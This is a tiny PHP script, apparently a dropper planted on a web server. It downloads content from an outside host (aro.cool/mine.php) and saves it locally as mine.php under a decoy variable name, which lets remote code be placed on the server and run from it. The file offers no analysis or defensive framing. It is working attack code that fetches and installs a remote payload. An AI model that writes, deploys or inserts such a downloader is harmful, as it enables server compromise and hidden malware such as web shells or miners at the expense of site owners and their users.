<?php

$google847474747474 = file_get_contents("http://aro.cool/mine.php?q=info");

$google847474747474 = file_put_contents("mine.php","$google847474747474");

echo "$google847474747474";

?>

